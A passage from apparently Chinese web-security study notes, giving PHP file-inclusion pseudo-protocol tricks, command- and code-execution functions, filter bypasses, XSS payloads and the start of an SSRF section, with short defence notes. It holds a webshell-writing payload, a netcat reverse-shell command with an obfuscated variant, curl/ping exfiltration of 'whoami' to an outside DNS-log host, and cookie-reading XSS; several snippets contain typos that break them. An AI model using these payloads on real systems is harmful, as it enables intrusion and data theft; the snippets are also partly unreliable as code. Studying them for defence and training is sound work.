[write=]</p><p>对数据进行读取。在include后如果不编码，文件内容将会被包含到当前文件中，然后作为代码执行，而编码后包含进来的代码不可被执行了，所以会显示出来。</p></blockquote></li><li><p>代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读文件的base64编码（不加解码的话就是执行php）</span></span><br><span class="line">?filename=php:<span class="comment">//filter/[read=]convert.base64-encode/resource=xxx.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码（用于绕过base64编码禁止）</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=xxx.php</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;/resource=xxx.php</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="4-2-input"><a href="#4-2-input" class="headerlink" title="4.2 input"></a>4.2 input</h4><ul><li><p>作用</p><blockquote><p>读取POST上没有经过解析的原始数据。</p></blockquote></li><li><p>限制</p><blockquote><p>使用 enctype=”multipart/form-data” 该伪协议无效。</p></blockquote></li></ul><ol><li><p>读取 post 数据（无条件）</p><blockquote><ul><li>上传文件：<code>&lt;?php echo file_get_contents(&quot;php://input&quot;)&gt;;/post.php</code></li><li>post操作：<code>data</code>，回显 data</li></ul></blockquote></li><li><p>写木马（allow_url_include开启）</p><blockquote><ul><li>上传文件：<code>filename=php://input</code></li><li>post操作：<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li></ul></blockquote></li><li><p>执行命令（allow_url_include开启）</p><blockquote><ul><li><p>上传文件：<code>filename=php://input</code></p></li><li><p>post操作：<code>system</code></p></li></ul></blockquote></li></ol><h4 id="4-3-file"><a href="#4-3-file" class="headerlink" title="4.3 file"></a>4.3 file</h4><ul><li><p>作用</p><blockquote><p>访问本地系统文件，读取文件内容。（无条件）</p></blockquote></li><li><p>代码</p><blockquote><p><code>?filename=file://c:/boot.ini</code></p></blockquote></li></ul><h4 id="4-4-data"><a href="#4-4-data" class="headerlink" title="4.4 data"></a>4.4 data</h4><ul><li><p>作用</p><blockquote><p>读取数据，传入代码的话代码就会被执行。</p><p>allow_url_fopen 和 allow_url_include 开启</p></blockquote></li><li><p>代码</p><blockquote><p><code>?filename=data://text/plain;base64,&lt;data&gt;</code></p><p>data是base64编码后数据</p></blockquote></li><li><p>例</p><blockquote><p><code>data=PD9waHAgcGhwaW5mbygpOz8%2b</code>（<code>&lt;?php phpinfo();?&gt;</code>）</p></blockquote></li></ul><h4 id="4-5-phar"><a href="#4-5-phar" class="headerlink" title="4.5 phar"></a>4.5 phar</h4><ul><li><p>作用</p><blockquote><p>解压，无论什么扩展名都会被当成压缩包。</p><p>allow_url_fopen 和 allow_url_include 开启</p></blockquote></li><li><p>代码</p><blockquote><p><code>?file=phar://压缩包/内部文件</code></p></blockquote></li><li><p>例</p><blockquote><p><code>?file=phar://shell.png/shell.php</code></p></blockquote></li></ul><h4 id="4-6-zip"><a href="#4-6-zip" class="headerlink" title="4.6 zip"></a>4.6 zip</h4><ul><li><p>作用</p><blockquote><p>同理 phar，用法不同。</p></blockquote></li><li><p>代码</p><blockquote><p><code>?file=zip://[压缩文件绝对路径] # [子文件名]</code></p></blockquote></li><li><p>例</p><blockquote><p><code>?file=zip://shell.png%23shell.php</code></p></blockquote></li></ul><h4 id="4-7-expect"><a href="#4-7-expect" class="headerlink" title="4.7 expect"></a>4.7 expect</h4><ul><li><p>作用</p><blockquote><p>处理交互式流。主要用来执行系统命令，需要装扩展。</p></blockquote></li><li><p>例</p><blockquote><p><code>?file=expect://ls</code></p></blockquote></li></ul><h3 id="5-PHP不常用伪协议"><a href="#5-PHP不常用伪协议" class="headerlink" title="5 PHP不常用伪协议"></a>5 PHP不常用伪协议</h3><ul><li><p>http</p><blockquote><p>作用：访问 http(s) url。</p></blockquote></li><li><p>ftp</p><blockquote><p>作用：访问 ftp(s) url。</p></blockquote></li><li><p>php</p><blockquote><p>作用：访问各个输入输出流。</p></blockquote></li><li><p>zlib</p><blockquote><p>作用：处理压缩流。</p></blockquote></li><li><p>glob</p><blockquote><p>作用：查找匹配的文件路径模式。</p></blockquote></li><li><p>ssh2</p><blockquote><p>作用：Secure Shell 2。</p></blockquote></li><li><p>rar</p><blockquote><p>作用：RAR数据压缩</p></blockquote></li><li><p>ogg</p><blockquote><p>作用：处理音频流。</p></blockquote></li></ul><h3 id="6-防护"><a href="#6-防护" class="headerlink" title="6 防护"></a>6 防护</h3><ul><li><p>代码层</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;home&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span> .<span class="variable">$filename</span> .<span class="string">&#x27;.php&#x27;</span>;<span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li><li><p>配置</p><ol><li>包含特定目录：<code>open_basedir=/var/www/html/</code>。（最后一个 / 要加）</li><li>关闭 all_url_include。</li></ol></li></ul><hr><h2 id="六、命令执行漏洞"><a href="#六、命令执行漏洞" class="headerlink" title="六、命令执行漏洞"></a>六、命令执行漏洞</h2><h3 id="1-php函数"><a href="#1-php函数" class="headerlink" title="1 php函数"></a>1 php函数</h3><blockquote><p><a href="https://blog.csdn.net/figli/article/details/41007573">proc_open</a>   </p><p><a href="https://cloud.tencent.com/developer/section/1344774">stream_get_contents</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行外部程序并输出。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span> [,<span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部程序，输出需要加上 echo。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span> [,<span class="keyword">array</span> &amp;<span class="variable">$output</span> [,<span class="keyword">int</span> &amp;<span class="variable">$return</span> _var]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># shell 执行，输出需要加上 echo。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部程序并显示原始输出。    </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">passthru</span>( <span class="keyword">string</span> <span class="variable">$command</span> [ , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开进程文件指针。</span></span><br><span class="line">resource <span class="title function_ invoke__">popen</span>( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">popen</span>(<span class="string">&quot;touch test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="meta">?&gt;</span> <span class="comment"># 可以在服务器中创建文件。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令，并打开用来输入输出的文件指针。</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>,<span class="keyword">array</span> <span class="variable">$descriptorspec</span>,<span class="keyword">array</span> &amp;<span class="variable">$pipes</span>[,<span class="keyword">string</span> <span class="variable">$cmd</span>[,<span class="keyword">array</span> <span class="variable">$env</span> [,<span class="keyword">array</span> <span class="variable">$other_options</span>]]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$proc</span> = <span class="title function_ invoke__">poroc_open</span>(<span class="string">&quot;whoami&quot;</span>,<span class="keyword">array</span>( <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)),<span class="variable">$pipes</span> );<span class="keyword">print</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将反引号作为 shell 命令尝试执行。</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>`whoami` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-Windows函数"><a href="#2-Windows函数" class="headerlink" title="2 Windows函数"></a>2 Windows函数</h3><blockquote><p><a href="..\..\Main\OS_Security\Windows操作系统.md">Windows操作系统</a>——Bat脚本——特殊字符。</p><p>&amp;：前后都执行。</p><p>|：仅执行最后（当参数）。</p></blockquote><h3 id="3-Linux函数"><a href="#3-Linux函数" class="headerlink" title="3 Linux函数"></a>3 Linux函数</h3><blockquote><p><a href="..\..\Main\OS_Security\Ubuntu LInux.md">Ubuntu Linux</a>——高级技巧——命令排列。</p><p>; ：所有命令都被执行。</p><p>&amp;：多条命令在后台执行。</p></blockquote><h3 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4 绕过"></a>4 绕过</h3><h4 id="4-1-空格绕过"><a href="#4-1-空格绕过" class="headerlink" title="4.1 空格绕过"></a>4.1 空格绕过</h4><blockquote><p><a href="https://liloong3t.com/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/"><script type="math/tex">IFS</script>9原理</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># $&#123;IFS&#125;：shell 特殊环境变量，内部域分隔符，默认空白字符（空格，制表符和换行符等）</span></span><br><span class="line">cat$&#123;IFS&#125;<span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">$IFS$<span class="number">9</span>，$IFS$<span class="number">1</span> <span class="comment"># 空格</span></span><br><span class="line"><span class="variable">$PS2</span> <span class="comment"># &gt;</span></span><br><span class="line"><span class="variable">$PS4</span> <span class="comment"># +</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url 编码，制表符代替空格。</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line"><span class="comment"># &#123;&#125;</span></span><br><span class="line">&#123; cat , <span class="number">1</span>.php &#125;</span><br><span class="line"><span class="comment"># 重定向输入</span></span><br><span class="line">cat&lt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><h4 id="4-2-关键字绕过"><a href="#4-2-关键字绕过" class="headerlink" title="4.2 关键字绕过"></a>4.2 关键字绕过</h4><ul><li><p>变量赋值</p><blockquote><p>原理：php 变量可以转换成值后直接拼接成字符串。</p></blockquote><p><code>a=c;b=at;$a$b 1.php</code></p></li><li><p>空变量</p><blockquote><p>原理：空变量等于空。</p></blockquote><p><code>ca$&#123;x&#125;t 1.php</code></p></li><li><p>系统变量</p><blockquote><p>原理：系统变量自带值，直接提取系统变量中的值使用。</p><p> 查看系统值：<code>echo $&#123;SHELLOPTS&#125;</code></p></blockquote><p><code>$&#123;SHELLOPTS:3:1&#125;at 1.php</code></p></li><li><p>\绕过</p><blockquote><p>原理：换行输入。</p></blockquote><p><code>c\a\t 1.php</code></p></li><li><p>通配符</p><ul><li><p>0 - n 个字符。</p></li><li><p>?  一个任意字符。</p></li><li><p>[]  字符范围，表示该范围内任一字符。（例：[a~z]）</p><p><code>/etc/passwd：cat /???/???sw?</code></p></li></ul></li><li><p>shell反弹</p><blockquote><p>原理：让客户机连接自己，自己作为服务器。</p><p>IP绕过：IP转化为十进制。</p><p>建立服务器：<code>nc -lp port</code></p></blockquote><ul><li>原命令：<br><code>/bin/nc 192.168.91.138 8888 -e /bin/bash</code></li><li>绕过：<br><code>/b??/?c 3232258951 -e /???/b??h</code>（-e 默认关，需要改版本）</li></ul></li><li><p>base64</p><blockquote><p>原理：先编码再解码</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;aWQ=&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-3-其他绕过"><a href="#4-3-其他绕过" class="headerlink" title="4.3 其他绕过"></a>4.3 其他绕过</h4><blockquote><p><a href="https://github.com/BugScanTeam/DNSLog">DNSLog下载</a></p></blockquote><ul><li><p>expr &amp; awk</p><blockquote><p>原理：从其他文件中获得字符并进行命令构造</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">expr</span> substr $(awk NR=1 ctfs-wiki) 1 1</span><br></pre></td></tr></table></figure></li><li><p>无回显命令执行</p><blockquote><p>无法反弹 shell 可以 DNS 管道解析获得信息。</p></blockquote><ul><li><p>Linux 用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl test.ctfs-wiki.com/ `<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure></li><li><p>Linux 用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 whoami.test.ctfs-wiki.com</span><br></pre></td></tr></table></figure></li><li><p>Windows 计算机名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> (<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">do</span> start http://test.ctfs-wiki.com/%x</span><br></pre></td></tr></table></figure></li><li><p>Windows 用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F <span class="string">&quot;delims=\ tokens=2&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">do</span> ping -n 1 %i.test.ctfs-wiki.com</span><br></pre></td></tr></table></figure></li><li><p>网站用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://test.ctfs-wiki.com/?&quot;</span>`<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="5-防护"><a href="#5-防护" class="headerlink" title="5 防护"></a>5 防护</h3><blockquote><p><a href="https://blog.csdn.net/LYJ20010728/article/details/116902085">绕过防护</a></p></blockquote><ol><li>PHP配置文件 disable_functions 禁用敏感函数。</li><li><code>string escapeshellarg(string $arg)</code>：给字符串加一个单引号，存在的单引号会被转义。</li><li><code>string escapeshellcmd(string $command)</code>：特殊字符都会被转义。</li></ol><hr><h2 id="七、代码执行漏洞"><a href="#七、代码执行漏洞" class="headerlink" title="七、代码执行漏洞"></a>七、代码执行漏洞</h2><h3 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1 普通函数"></a>1 普通函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把字符串作为php代码执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 检查一个断言是否为FALSE</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>[,<span class="built_in">Throwable</span> <span class="variable">$exception</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把第一个参数作为回调函数调用，之后跟参数</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>[,<span class="keyword">mixed</span> <span class="variable">$parameter</span>[,<span class="keyword">mixed</span> <span class="variable">$parameter</span> ...]]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun=system&amp;arg=id <span class="comment"># post请求</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 把第一个参数作为回调函数调用，之后跟参数数组</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>,<span class="keyword">array</span> <span class="variable">$param_arr</span>);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun=system&amp;arg=id <span class="comment"># post请求</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 根据参数创建匿名函数，并为该匿名函数返回唯一名称</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>,<span class="keyword">string</span> <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$func</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$func&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 等价于下列代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">fucntion <span class="title function_ invoke__">func</span>(<span class="variable">$func</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 使用代码</span></span><br><span class="line">?id=<span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/* # 前面需要/*，这是注释保证后面代码颜色*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为数组每个元素应用回调函数</span></span><br><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">array_map</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>,<span class="keyword">array</span> <span class="variable">$array1</span>[,<span class="keyword">array</span> <span class="variable">$array2</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$argv</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$argv</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 使用代码</span></span><br><span class="line">?func=system&amp;argv=id;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行一个正则表达式的搜索和替换。在subject中正则找到pattern中的内容，用replacement替代</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">mixed</span> <span class="variable">$pattern</span>,<span class="keyword">mixed</span> <span class="variable">$replacement</span>,<span class="keyword">mixed</span> <span class="variable">$subject</span>[,<span class="keyword">int</span> <span class="variable">$limit</span>=-<span class="number">1</span>[,<span class="keyword">int</span> &amp;<span class="variable">$count</span>]]);</span><br><span class="line"><span class="comment"># $pattern中以e结尾可以执行php</span></span><br></pre></td></tr></table></figure><h3 id="2-可变函数"><a href="#2-可变函数" class="headerlink" title="2 可变函数"></a>2 可变函数</h3><blockquote><p>变量名后有圆括号会被当成函数执行。</p></blockquote><hr><h2 id="八、XSS漏洞"><a href="#八、XSS漏洞" class="headerlink" title="八、XSS漏洞"></a>八、XSS漏洞</h2><h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1 反射型"></a>1 反射型</h3><blockquote><p>发给服务器后服务器执行了script脚本后再发回来，代码不存入服务器。</p><p><a href="https://blog.csdn.net/weixin_45488495/article/details/115793888">反射型XSS原理及实操</a></p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--执行代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span>&gt;</span>alter(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--获得cookie--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alter</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2 存储型"></a>2 存储型</h3><blockquote><p>存在服务器。</p><p>发给服务器后服务器执行了script脚本后再发回来，代码存入服务器，之后用户访问都会执行该脚本。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--篡改链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> links = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; links.<span class="property">length</span>;i++)</span></span><br><span class="line"><span class="language-javascript">    links[i].<span class="property">href</span>=<span class="string">&quot;http://www.xxx.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3 DOM型"></a>3 DOM型</h3><blockquote><p>基于文档对象模型（Document Object Model）</p><p>前端漏洞，存在于script的DOM对象中的漏洞，不与服务器交互。</p><p><code>&lt;img src=1 onerror=alert(/ctfs/)/&gt;</code>：注入代码，找不到源会报错。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常见可能存在DOM的代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">innerHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">outerHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">insertAdjacentHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">onevent</span></span><br></pre></td></tr></table></figure><h3 id="4-绕过-1"><a href="#4-绕过-1" class="headerlink" title="4 绕过"></a>4 绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1.引号变成反引号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span>&gt;</span>alter(`1`)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--2.双写绕过--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(&quot;xss&quot;)<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--3.编码绕过--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编码可以是Unicode，URL，ASCII，进制，base64--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(base64))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#100;</span><span class="symbol">&amp;#100;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--4.伪协议绕过--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hrrf</span>=<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--5.空格绕过--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sc</span> <span class="attr">ript</span>&gt;</span>alert(&quot;xss&quot;)&lt;/s cript&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--6.script绕过--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">111</span>&#x27;);&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-防护-1"><a href="#5-防护-1" class="headerlink" title="5 防护"></a>5 防护</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换字符为HTML字符编码。quotestyle：定义如何对单引号和双引号进行编码</span></span><br><span class="line"><span class="title function_ invoke__">htmlentities</span>(<span class="keyword">string</span>,[quotestyle,character-set]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预定义特殊字符转化成html实体。如：&amp;,&lt;,&gt;（默认不编码单引号）</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ENT_COMPAT：默认。仅编码双引号</span></span><br><span class="line"><span class="comment">ENT_QUOTES：编码单双引号</span></span><br><span class="line"><span class="comment">ENT_NOQUOTES：不编码任何引号</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="keyword">string</span>,ENT_QUOTES);</span><br></pre></td></tr></table></figure><hr><h2 id="九、SSRF漏洞"><a href="#九、SSRF漏洞" class="headerlink" title="九、SSRF漏洞"></a>九、SSRF漏洞</h2><h3 id="1-利用"><a href="#1-利用" class="headerlink" title="1 利用"></a>1 利用</h3><blockquote><p>Server-Side Request Forge，服务端请求伪造。用于内网渗透。</p><p>原因：服务器可以访问网络中其他服务器，对url没有严格过滤。</p><p><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher</a></p></blockquote><ul><li>利用方式<ul><li>通过服务器获取内网主机、端口和 banner 信息</li><li>对内网的应用程序进行攻击，例如 Redis、JBoss等</li><li>利用 file:// 伪协议读取文件</li><li>可以攻击内网程序，造成缓冲区溢出</li></ul></li><li>易出现场景<ul><li>转码服务</li><li>在线翻译</li><li>分享，通过 url 地址分享文章</li><li>通过 url 地址加载或下载图片</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取</li><li>远程加载头像</li><li>一切可以输入网址和 IP 的地方</li></ul></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 敏感php函数</span></span><br><span class="line"><span class="comment"># 对传入的url进行请求并返回请求结果</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(url);</span><br><span class="line"><span class="comment"># 把整个文件读入一个字符串中</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(path[,include_path,context,start,max_length]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用</span></span><br><span class="line"><span class="comment"># 